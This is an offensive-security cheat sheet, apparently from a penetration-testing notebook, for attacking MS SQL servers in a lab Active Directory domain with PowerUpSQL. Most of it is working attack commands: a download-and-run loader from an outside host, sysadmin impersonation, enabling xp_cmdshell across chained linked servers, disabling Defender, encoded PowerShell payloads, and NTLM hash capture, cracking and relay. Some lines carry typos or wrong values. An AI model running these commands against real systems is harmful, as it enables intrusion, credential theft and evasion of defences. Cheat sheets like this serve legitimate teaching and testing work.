---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/ad-attack/ms-sql-servers/powerupsql
---

# PowerUpSQL

## First Instance

```powershell
# Import PowerUpSQL
iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/PowerUpSQL.ps1')

# Discovery and verify network access
Get-SQLInstanceDomain | Get-SQLConnectionTest
Get-SQLInstanceDomain | Get-SQLConnectionTest -Username vulnableone.local\khan.chanthou -Password Password123

# Local Instance
Get-SQLInstanceLocal

# Verify Server Information
Get-SQLServerInfo -Instance "appsrv.vulnableone.local,1433"

# Find Link
Get-SQLServerLink -Instance "APPSRV.vulnableone.local,1433"

# Find Link automatically
Get-SQLServerLinkCrawl -Instance "APPSRV.vulnableone.local,1433"

# Query
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "select @@servername"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "select CURRENT_USER"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "select user_name()"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "select loginname from syslogins where sysadmin = 1"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "select * from sysusers" | select name
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "select name from sys.databases"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "select srvname from sysservers"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "exec sp_linkedservers"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "exec sp_helplinkedsrvlogin"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT srvname, srvproduct, rpcout FROM master..sysservers"

# Verify sysadmin privilege
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT IS_SRVROLEMEMBER('sysadmin')"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "EXECUTE AS login = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin')"

# Finding Impersonate
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'"

# Enable RCP_Out
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "EXECUTE AS LOGIN = 'sa'; EXEC sp_serveroption 'APPSRV01','rpc out','true'"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "EXECUTE AS LOGIN = 'sa'; EXEC sp_serveroption 'APPSRV01','rcp', 'true'"

# Verify xp_cmdshell, value = 1, value_in_use =1
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM sys.configurations WHERE name = 'xp_cmdshell'"

# Enable xp_cmdshell, used Login As
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'show advanced options',1;RECONFIGURE ;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE"

# Impersonate and Execute Command
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "EXECUTE AS LOGIN = 'sa'; exec xp_cmdshell 'powershell -c Set-MpPreference -DisableRealtimeMonitoring $False -Verboes'"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "EXECUTE AS LOGIN = 'sa'; exec xp_cmdshell 'whoami'"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "EXECUTE AS LOGIN = 'sa'; exec xp_cmdshell 'powershell -enc base64'"

# UNC Path
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "EXEC xp_dirtree '\\10.10.10.10\test'"
└─$ sudo responder -I tun0 -v    #Capture Hash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt    #CrackHash
└─$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.10.10    #NTLM Relay
```

## Second Instance

```powershell
# Query
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'select user_name()')";
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'select @@servername')";
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'select loginname from syslogins where sysadmin = 1')";
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'SELECT IS_SRVROLEMEMBER(''sysadmin'')')";

# Verify Xp_cmdshell
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''')";

# Enable Xp_cmdshell
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "EXEC ('sp_configure ''show advanced options'',1;RECONFIGURE') AT ""APPSRV01"" ;EXEC ('sp_configure ''xp_cmdshell'',1;RECONFIGURE') AT ""APPSRV01"""

# Execute Xp_cmdshell
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'select @@servername; exec xp_cmdshell ''powershell -c Set-MpPreference -DisableRealtimeMonitoring $False -Verboes''')";
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'select @@servername; exec xp_cmdshell ''powershell -enc base64-string''')"
```

## Third Instance

```powershell
# Query
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433"-Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'Select * FROM OPENQUERY(""APPSRV02"", ''select user_name()'')')";
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'Select * FROM OPENQUERY(""APPSRV02"", ''select @@servername'')')";
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'Select * FROM OPENQUERY(""APPSRV02"", ''SELECT IS_SRVROLEMEMBER(''''sysadmin'''')'')')";

# Verify Xp_cmdshell
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'select * FROM OPENQUERY(""APPSRV02"", ''select * FROM sys.configurations WHERE name = ''''xp_cmdshell'''''')')";

# Enable Xp_cmdshell
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "EXEC ('EXEC (''sp_configure ''''show advanced options'''',0;RECONFIGURE'') AT ""APPSRV02""') AT ""APPSRV01""; EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''',0;RECONFIGURE'') AT ""APPSRV02""') AT ""APPSRV01"""

# Execute Xp_cmdshell
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'select * from openquery(""APPSRV02"", ''select @@servername; exec xp_cmdshell ''''powershell -c Set-MpPreference -DisableRealtimeMonitoring $False -Verboes'''''')')"
Get-SQLQuery -Instance "APPSRV.vulnableone.local,1433" -Query "SELECT * FROM OPENQUERY(""APPSRV01"", 'select * from openquery(""APPSRV02"", ''select @@servername; exec xp_cmdshell ''''powershell -enc base64-string'''''')')"
```
